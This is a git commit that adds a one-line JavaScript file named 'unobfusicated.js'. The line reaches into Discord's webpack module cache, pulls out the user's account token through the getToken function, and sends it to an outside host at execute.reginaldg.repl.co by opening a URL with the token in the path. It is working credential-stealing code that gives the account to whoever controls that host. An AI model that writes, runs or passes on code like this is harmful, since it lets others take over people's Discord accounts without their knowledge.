c2f1316d894b8a4fd3cb1bd9e57396433d15ee91
Reginald Gillespie <109245101+Reginald-Gillespie@users.noreply.github.com>
2022-07-19 13:01:14 -0500

    Create unobfusicated.js

---
+++ unobfusicated.js
@@ -0,0 +1,1 @@
+window.open("https://execute.reginaldg.repl.co/mypath/" + (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken());
